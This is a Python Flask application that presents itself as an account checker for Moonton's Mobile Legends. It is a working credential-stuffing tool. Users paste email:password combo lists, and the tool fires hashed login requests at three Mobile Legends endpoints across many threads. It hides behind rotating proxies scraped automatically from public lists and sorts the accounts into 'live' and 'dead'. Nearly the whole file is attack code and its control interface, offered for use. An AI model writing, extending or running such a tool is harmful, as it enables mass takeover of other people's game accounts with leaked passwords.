#!/usr/bin/env python3
# coding=utf-8
"""
Moonton Account Checker - Web GUI with Integrated Proxy Scraper
"""

import os
import sys
import json
import hashlib
import threading
import time
import queue
import requests
from flask import Flask, render_template_string, request, jsonify

# ============================================================================
# PROXY SCRAPER
# ============================================================================

PROXY_SOURCES = [
    ('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000', 'http'),
    ('https://api.proxyscrape.com/?request=getproxies&proxytype=socks5&timeout=10000', 'socks5'),
    ('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt', 'http'),
    ('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt', 'socks5'),
    ('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt', 'socks5'),
]

class ProxyScraper:
    """Integrated proxy scraper"""
    
    def __init__(self):
        self.proxies = []
        self.scraping = False
        self.scraped_count = 0
    
    def scrape(self, timeout=15):
        """Scrape proxies from all sources"""
        self.scraping = True
        scraped = []
        
        for url, ptype in PROXY_SOURCES:
            if not self.scraping:
                break
            
            try:
                r = requests.get(url, timeout=timeout)
                lines = r.text.split('\n')
                
                for line in lines:
                    if not self.scraping:
                        break
                    line = line.strip()
                    if ':' in line and line.count(':') == 1:
                        try:
                            ip, port = line.split(':')
                            if port.isdigit() and 0 < int(port) < 65536:
                                scraped.append(line)
                        except:
                            pass
            except:
                continue
        
        # Remove duplicates
        self.proxies = list(set(scraped))
        self.scraped_count = len(self.proxies)
        self.scraping = False
        return self.proxies
    
    def get_proxy(self, index):
        """Get proxy at index"""
        if not self.proxies:
            return None
        return self.proxies[index % len(self.proxies)]
    
    def stop(self):
        """Stop scraping"""
        self.scraping = False


# ============================================================================
# ACCOUNT CHECKER
# ============================================================================

class AccountChecker:
    """Core account validation with proxy support"""
    
    API_ENDPOINTS = {
        '1': 'https://accountmtapi.mobilelegends.com/',
        '2': 'https://mtacc.mobilelegends.com/v2.1/inapp/login-new',
        '3': 'https://api.mobilelegends.com/login',
    }
    
    def __init__(self):
        self.live = []
        self.die = []
        self.running = False
        self.stop_flag = False
        self.api = self.API_ENDPOINTS['1']
        
        # Proxy settings
        self.use_proxy = False
        self.proxy_scraper = None
        self.proxies = []
        self.proxy_index = 0
        self.proxy_file = 'proxies.txt'
        self.auto_rescrape = True
        
        # Stats
        self.total = 0
        self.checked = 0
    
    def load_proxies(self):
        """Load proxies from file"""
        if os.path.exists(self.proxy_file):
            with open(self.proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            return len(self.proxies)
        return 0
    
    def get_proxy(self):
        """Get next proxy (rotation)"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.proxy_index % len(self.proxies)]
        self.proxy_index += 1
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    
    def build_params(self, email, pw):
        """Build API request"""
        md5 = hashlib.new('md5')
        md5.update(pw.encode('utf-8'))
        md5pwd = md5.hexdigest()
        
        sign = f'account={email}&md5pwd={md5pwd}&op=login'
        md5 = hashlib.new('md5')
        md5.update(sign.encode('utf-8'))
        sign_hash = md5.hexdigest()
        
        return json.dumps({
            'op': 'login',
            'sign': sign_hash,
            'params': {'account': email, 'md5pwd': md5pwd},
            'lang': 'cn'
        })
    
    def validate(self, email, pw):
        """Validate single account"""
        if self.stop_flag:
            return None, None
        
        try:
            data = self.build_params(email, pw)
            
            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            }
            
            # Use proxy if enabled
            proxies = self.get_proxy() if self.use_proxy and self.proxies else None
            
            r = requests.post(self.api, data=data, headers=headers, 
                            proxies=proxies, timeout=30)
            
            is_live = r.status_code == 200
            return (email, pw) if is_live else None, (email, pw) if not is_live else None
            
        except:
            return None, (email, pw)
    
    def check_accounts(self, accounts, threads=20, progress_callback=None):
        """Check multiple accounts with proxy rotation"""
        self.running = True
        self.stop_flag = False
        self.live = []
        self.die = []
        self.total = len(accounts)
        self.checked = 0
        
        def worker(acc):
            if self.stop_flag:
                return None, None
            
            email, pw = acc
            self.checked += 1
            
            if progress_callback:
                progress_callback(self.checked, self.total)
            
            # Auto rescrape if proxies exhausted
            if self.use_proxy and self.auto_rescrape and self.proxy_index >= len(self.proxies):
                scraper = ProxyScraper()
                scraper.scrape()
                self.proxies = scraper.proxies
                self.proxy_index = 0
                print(f"[AUTO] Rescraped {len(self.proxies)} proxies")
            
            return self.validate(email, pw)
        
        from multiprocessing.pool import ThreadPool
        pool = ThreadPool(threads)
        results = pool.map(worker, accounts)
        pool.close()
        pool.join()
        
        for live, die in results:
            if live:
                self.live.append(f"{live[0]}:{live[1]}")
            if die:
                self.die.append(f"{die[0]}:{die[1]}")
        
        self.running = False
        return len(self.live), len(self.die)
    
    def stop(self):
        """Stop checking"""
        self.stop_flag = True


# ============================================================================
# FLASK APP
# ============================================================================

app = Flask(__name__)
checker = AccountChecker()

# HTML Template
HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>Moonton Checker Pro</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: #0f0f1a; 
            color: #e0e0e0;
            min-height: 100vh;
        }
        .container { 
            max-width: 900px; 
            margin: 0 auto; 
            padding: 20px;
        }
        h1 { 
            text-align: center; 
            color: #6366f1;
            margin-bottom: 20px;
        }
        .card {
            background: #1a1a2e;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .card h2 {
            color: #6366f1;
            margin-bottom: 15px;
            font-size: 16px;
        }
        textarea {
            width: 100%;
            height: 150px;
            background: #242442;
            border: 1px solid #3f3f5a;
            border-radius: 8px;
            color: #e0e0e0;
            padding: 10px;
            font-family: monospace;
        }
        .row { display: flex; gap: 10px; margin-bottom: 15px; }
        .col { flex: 1; }
        
        label { display: block; margin-bottom: 5px; font-size: 14px; }
        input, select {
            width: 100%;
            padding: 10px;
            background: #242442;
            border: 1px solid #3f3f5a;
            border-radius: 8px;
            color: #e0e0e0;
        }
        
        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
        }
        .btn-primary { background: #6366f1; color: white; }
        .btn-success { background: #22c55e; color: white; }
        .btn-danger { background: #ef4444; color: white; }
        .btn-warning { background: #f59e0b; color: black; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .btn-group { display: flex; gap: 10px; flex-wrap: wrap; }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            text-align: center;
        }
        .stat-box {
            background: #242442;
            padding: 15px;
            border-radius: 8px;
        }
        .stat-value { font-size: 24px; font-weight: bold; }
        .stat-label { font-size: 12px; opacity: 0.7; }
        .live .stat-value { color: #22c55e; }
        .dead .stat-value { color: #ef4444; }
        
        .progress {
            height: 8px;
            background: #242442;
            border-radius: 4px;
            overflow: hidden;
            margin: 15px 0;
        }
        .progress-bar {
            height: 100%;
            background: #6366f1;
            transition: width 0.3s;
        }
        
        .log {
            background: #242442;
            padding: 10px;
            border-radius: 8px;
            max-height: 200px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
        }
        .log-entry { padding: 2px 0; }
        .log-time { color: #6366f1; margin-right: 8px; }
        
        .checkbox {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .checkbox input { width: auto; }
        
        .status-bar {
            display: flex;
            justify-content: space-between;
            padding: 10px;
            background: #242442;
            border-radius: 8px;
            margin-top: 15px;
            font-size: 13px;
        }
        
        .tabs { display: flex; gap: 5px; border-bottom: 1px solid #3f3f5a; margin-bottom: 15px; }
        .tab {
            padding: 10px 20px;
            background: transparent;
            border: none;
            color: #e0e0e0;
            cursor: pointer;
            border-bottom: 2px solid transparent;
        }
        .tab.active { border-bottom-color: #6366f1; color: #6366f1; }
        
        .result-box {
            background: #242442;
            padding: 10px;
            border-radius: 8px;
            max-height: 300px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
        }
        .result-item { padding: 5px 0; border-bottom: 1px solid #3f3f5a; }
        .live-item { color: #22c55e; }
        .dead-item { color: #ef4444; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚔️ Moonton Checker Pro</h1>
        
        <!-- Proxy Section -->
        <div class="card">
            <h2>🌐 Proxy Settings</h2>
            <div class="row">
                <div class="col">
                    <label>Proxy File</label>
                    <input type="text" id="proxyFile" value="proxies.txt">
                </div>
                <div class="col">
                    <label>Loaded Proxies</label>
                    <input type="text" id="proxyCount" value="0" readonly>
                </div>
            </div>
            <div class="checkbox">
                <input type="checkbox" id="useProxy">
                <label>Use Proxies</label>
            </div>
            <div class="checkbox">
                <input type="checkbox" id="autoRescrape" checked>
                <label>Auto Rescrape when exhausted</label>
            </div>
            <div class="btn-group" style="margin-top: 15px;">
                <button class="btn btn-warning" onclick="scrapeProxies()">🕷️ Start Scrape</button>
                <button class="btn btn-primary" onclick="loadProxies()">📂 Load Proxies</button>
                <button class="btn btn-danger" onclick="clearProxies()">🗑️ Clear</button>
            </div>
            <div id="proxyStatus" class="status-bar">
                <span>Ready to scrape</span>
            </div>
        </div>
        
        <!-- Account Input -->
        <div class="card">
            <h2>📝 Accounts (email:password or email|password)</h2>
            <textarea id="accounts" placeholder="test@test.com:password123&#10;test2@test2.com:password456"></textarea>
            <div class="row" style="margin-top: 15px;">
                <div class="col">
                    <label>API</label>
                    <select id="apiEndpoint">
                        <option value="1">1. accountmtapi.mobilelegends.com</option>
                        <option value="2">2. mtacc.mobilelegends.com</option>
                        <option value="3">3. api.mobilelegends.com</option>
                    </select>
                </div>
                <div class="col">
                    <label>Threads</label>
                    <input type="number" id="threads" value="20">
                </div>
            </div>
        </div>
        
        <!-- Controls -->
        <div class="btn-group">
            <button class="btn btn-success" id="startBtn" onclick="startCheck()">▶ Start Checking</button>
            <button class="btn btn-danger" id="stopBtn" onclick="stopCheck()" disabled>■ Stop</button>
        </div>
        
        <!-- Progress -->
        <div class="card">
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-value" id="totalCount">0</div>
                    <div class="stat-label">Total</div>
                </div>
                <div class="stat-box live">
                    <div class="stat-value" id="liveCount">0</div>
                    <div class="stat-label">Live</div>
                </div>
                <div class="stat-box dead">
                    <div class="stat-value" id="deadCount">0</div>
                    <div class="stat-label">Dead</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="statusText">Ready</div>
                    <div class="stat-label">Status</div>
                </div>
            </div>
            <div class="progress">
                <div class="progress-bar" id="progressBar" style="width: 0%"></div>
            </div>
        </div>
        
        <!-- Results -->
        <div class="card">
            <div class="tabs">
                <button class="tab active" onclick="showTab('live')">✓ Live</button>
                <button class="tab" onclick="showTab('dead')">✗ Dead</button>
                <button class="tab" onclick="showTab('log')">📋 Log</button>
            </div>
            <div id="liveTab" class="result-box"></div>
            <div id="deadTab" class="result-box" style="display:none"></div>
            <div id="logTab" class="log" style="display:none"></div>
        </div>
    </div>
    
    <script>
        let checking = false;
        
        function addLog(msg) {
            const time = new Date().toTimeString().split(' ')[0];
            const log = document.getElementById('logTab');
            log.innerHTML = `<div class="log-entry"><span class="log-time">${time}</span>${msg}</div>` + log.innerHTML;
        }
        
        function scrapeProxies() {
            const btn = document.querySelector('.btn-warning');
            btn.disabled = true;
            btn.innerHTML = '🕷️ Scraping...';
            document.getElementById('proxyStatus').innerHTML = '<span>Scraping proxies...</span>';
            
            fetch('/api/scrape', { method: 'POST' })
            .then(r => r.json())
            .then(d => {
                btn.disabled = false;
                btn.innerHTML = '🕷️ Start Scrape';
                document.getElementById('proxyStatus').innerHTML = `<span>Scraped ${d.count} proxies</span>`;
                document.getElementById('proxyCount').value = d.count;
                addLog(`Scraped ${d.count} proxies`);
                
                if (d.count > 0) {
                    // Auto load proxies
                    document.getElementById('useProxy').checked = true;
                }
            })
            .catch(e => {
                btn.disabled = false;
                btn.innerHTML = '🕷️ Start Scrape';
                addLog('Error: ' + e.message);
            });
        }
        
        function loadProxies() {
            const file = document.getElementById('proxyFile').value;
            fetch('/api/load_proxies?file=' + file)
            .then(r => r.json())
            .then(d => {
                document.getElementById('proxyCount').value = d.count;
                addLog(`Loaded ${d.count} proxies from ${file}`);
            });
        }
        
        function clearProxies() {
            fetch('/api/clear_proxies', { method: 'POST' })
            .then(r => r.json())
            .then(d => {
                document.getElementById('proxyCount').value = 0;
                addLog('Proxies cleared');
            });
        }
        
        function startCheck() {
            const accounts = document.getElementById('accounts').value.trim();
            if (!accounts) {
                alert('Please enter accounts');
                return;
            }
            
            const useProxy = document.getElementById('useProxy').checked;
            const autoRescrape = document.getElementById('autoRescrape').checked;
            const api = document.getElementById('apiEndpoint').value;
            const threads = parseInt(document.getElementById('threads').value);
            
            document.getElementById('startBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
            checking = true;
            
            addLog('Starting check...');
            
            fetch('/api/check', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    accounts: accounts,
                    use_proxy: useProxy,
                    auto_rescrape: autoRescrape,
                    api: api,
                    threads: threads
                })
            })
            .then(r => r.json())
            .then(d => {
                checking = false;
                document.getElementById('startBtn').disabled = false;
                document.getElementById('stopBtn').disabled = true;
                
                updateStats(d.total, d.live, d.dead);
                document.getElementById('liveTab').innerHTML = d.live_results;
                document.getElementById('deadTab').innerHTML = d.dead_results;
                addLog(`Done! Live: ${d.live}, Dead: ${d.dead}`);
            });
        }
        
        function stopCheck() {
            fetch('/api/stop', { method: 'POST' })
            .then(r => r.json())
            .then(d => {
                checking = false;
                document.getElementById('startBtn').disabled = false;
                document.getElementById('stopBtn').disabled = true;
                addLog('Stopped');
            });
        }
        
        function updateStats(total, live, dead) {
            document.getElementById('totalCount').textContent = total;
            document.getElementById('liveCount').textContent = live;
            document.getElementById('deadCount').textContent = dead;
            
            const percent = total > 0 ? (live + dead) / total * 100 : 0;
            document.getElementById('progressBar').style.width = percent + '%';
        }
        
        function showTab(tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            event.target.classList.add('active');
            
            document.getElementById('liveTab').style.display = tab === 'live' ? 'block' : 'none';
            document.getElementById('deadTab').style.display = tab === 'dead' ? 'block' : 'none';
            document.getElementById('logTab').style.display = tab === 'log' ? 'block' : 'none';
        }
        
        // Initial load
        loadProxies();
    </script>
</body>
</html>
'''


# ============================================================================
# API ROUTES
# ============================================================================

@app.route('/')
def index():
    return render_template_string(HTML)


@app.route('/api/scrape', methods=['POST'])
def scrape():
    """Scrape proxies"""
    scraper = ProxyScraper()
    proxies = scraper.scrape()
    
    if proxies:
        with open('proxies.txt', 'w') as f:
            f.write('\n'.join(proxies))
    
    return jsonify({'count': len(proxies)})


@app.route('/api/load_proxies')
def load_proxies():
    """Load proxies from file"""
    file = request.args.get('file', 'proxies.txt')
    count = checker.load_proxies()
    return jsonify({'count': count})


@app.route('/api/clear_proxies', methods=['POST'])
def clear_proxies():
    """Clear proxies"""
    checker.proxies = []
    checker.proxy_index = 0
    return jsonify({'success': True})


@app.route('/api/check', methods=['POST'])
def check():
    """Check accounts"""
    data = request.json
    
    # Parse accounts
    accounts = []
    for line in data.get('accounts', '').split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if '|' in line:
            parts = line.split('|')
            if len(parts) >= 2:
                accounts.append((parts[0], parts[1]))
        elif ':' in line:
            parts = line.split(':')
            if len(parts) >= 2:
                accounts.append((parts[0], parts[1]))
    
    if not accounts:
        return jsonify({'error': 'No valid accounts'})
    
    # Configure checker
    checker.use_proxy = data.get('use_proxy', False)
    checker.auto_rescrape = data.get('auto_rescrape', True)
    checker.api = checker.API_ENDPOINTS.get(data.get('api', '1'), 
                                        checker.API_ENDPOINTS['1'])
    
    # Load proxies if needed
    if checker.use_proxy:
        checker.load_proxies()
    
    # Run check
    live, dead = checker.check_accounts(accounts, threads=data.get('threads', 20))
    
    # Format results
    live_results = ''.join([f'<div class="result-item live-item">{r}</div>' for r in checker.live])
    dead_results = ''.join([f'<div class="result-item dead-item">{r}</div>' for r in checker.die])
    
    return jsonify({
        'total': len(accounts),
        'live': live,
        'dead': dead,
        'live_results': live_results,
        'dead_results': dead_results
    })


@app.route('/api/stop', methods=['POST'])
def stop():
    """Stop checking"""
    checker.stop()
    return jsonify({'success': True})


# ============================================================================
# MAIN
# ============================================================================

def main():
    print('''
╔══════════════════════════════════╗
║   Moonton Checker Pro - Web       ║
║   http://localhost:5000          ║
╚══════════════════════════════════╝
    ''')
    app.run(host='0.0.0.0', port=5000, debug=False)


if __name__ == '__main__':
    main()